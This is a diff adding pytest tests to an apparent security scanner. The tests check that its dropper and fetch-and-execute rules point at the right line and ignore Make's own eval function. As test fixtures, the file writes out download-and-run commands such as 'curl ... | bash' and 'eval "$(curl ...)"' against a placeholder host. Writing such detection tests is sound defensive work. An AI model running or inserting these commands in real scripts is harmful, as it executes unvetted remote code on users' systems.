@@ -12045,3 +12045,102 @@ class TestAHiddenPayloadDefeatsEveryExcuse:
         assert rule.match.regex is not None
         assert rule.match.regex.search(seven) is None
         assert rule.match.regex.search("".join(chr(0xE0110 + i) for i in range(9)).encode())
+
+
+class TestTheEvidenceIsTwoHundredLinesFromTheFinding:
+    """`SUSPECT.DROPPER.001` pairs hits up to two hundred lines apart, and the
+    finding pointed at the earliest of them.
+
+    So `milvus-io/milvus` was shown `PWD := $(shell pwd)` on line 13 as the
+    evidence for a `curl | sh` on line 143, `hiddify/hiddify-app` was shown
+    `ifeq ($(shell uname),Darwin)` on 34 for one on 162, and
+    `community-scripts/ProxmoxVE` was shown twelve lines of figlet ASCII ART as
+    the evidence for a `source <(curl ...)` ten lines below it. Eight of sixteen
+    findings sampled from the corpus pointed somewhere misleading.
+
+    Every one of those findings is CORRECT. The rule is right and the report
+    makes it look like a tool that cannot read, which is the more expensive
+    failure: a false positive gets argued with, and this gets disbelieved.
+    """
+
+    BANNER = "\n".join(
+        [
+            "#!/usr/bin/env bash",
+            "#    _   ____________",
+            "#   / | / /  _/ ____/",
+            "#  /  |/ // // /",
+            "# /_/ |_/___/\\____/",
+            "set -euo pipefail",
+        ]
+    )
+
+    def _dropper(self, root):
+        return next(f for f in Scanner().scan(root).findings if f.rule_id == "SUSPECT.DROPPER.001")
+
+    def test_the_finding_points_at_the_fetch_and_not_at_the_banner(self, tmp_path) -> None:
+        body = [self.BANNER]
+        body.extend(f"echo 'step {n}'" for n in range(40))
+        body.append("curl -fsSL https://example.invalid/install.sh | bash")
+        text = "\n".join(body) + "\n"
+        (tmp_path / "install.sh").write_text(text, encoding="utf-8")
+        fetch = text.splitlines().index("curl -fsSL https://example.invalid/install.sh | bash") + 1
+
+        finding = self._dropper(tmp_path)
+        assert "curl" in (finding.evidence.snippet or ""), finding.evidence.snippet
+        assert finding.location.line == fetch
+
+    def test_one_line_is_still_anchored_where_it_always_was(self, tmp_path) -> None:
+        """The guard. When the capabilities ARE one construct there is nothing to
+        choose between, and the anchor must not move -- a fingerprint that
+        changed here would churn every suppression anybody has written."""
+        (tmp_path / "install.sh").write_text(
+            "#!/bin/sh\ncurl -sSL https://example.invalid/x | sh\n", encoding="utf-8"
+        )
+        assert self._dropper(tmp_path).location.line == 2
+
+
+class TestMakeSpellsEvalItsOwnWay:
+    """`$(eval ...)` is Make's function and `eval` is the shell's, and
+    `CAP.SH.FETCH_EXEC.001` read the first as the second.
+
+    `$(eval ID=$(shell curl -s '.../releases/tags/v$(VERSION)' | jq .id))` is
+    `jarun/nnn` asking the releases API for an id, and
+    `$(eval $(call BuildPackage,uclient-fetch))` is OpenWrt expanding a macro.
+    Neither runs anything it downloaded; both were `high`, "content fetched from
+    the network and executed".
+
+    The rule file already says a makefile is two languages in one file and
+    already splits `CAP.MK.SPAWN.001` out for it. This pattern was missed.
+    """
+
+    def _fires(self, root) -> bool:
+        return any(f.rule_id == "SUSPECT.DROPPER.001" for f in Scanner().scan(root).findings)
+
+    def test_a_make_function_named_eval_is_not_the_shells_eval(self, tmp_path) -> None:
+        (tmp_path / "Makefile").write_text(
+            "VERSION := 4.9\n"
+            "upload:\n"
+            "\t$(eval ID=$(shell curl -s "
+            "'https://example.invalid/repos/x/releases/tags/v$(VERSION)' | jq .id))\n",
+            encoding="utf-8",
+        )
+        assert not self._fires(tmp_path)
+
+    def test_a_make_macro_expansion_is_not_a_download(self, tmp_path) -> None:
+        (tmp_path / "Makefile").write_text(
+            "define Package/uclient-fetch\n"
+            "  TITLE:=Tiny wget replacement using libuclient\n"
+            "endef\n"
+            "$(eval $(call BuildPackage,uclient-fetch))\n",
+            encoding="utf-8",
+        )
+        assert not self._fires(tmp_path)
+
+    def test_a_recipe_line_that_really_does_it_still_fires(self, tmp_path) -> None:
+        """The guard. A makefile recipe is shell, and shell `eval` has no `$(`
+        in front of it -- so the form this rule exists for is untouched."""
+        (tmp_path / "Makefile").write_text(
+            'install:\n\teval "$(curl -fsSL https://example.invalid/i.sh)"\n',
+            encoding="utf-8",
+        )
+        assert self._fires(tmp_path)
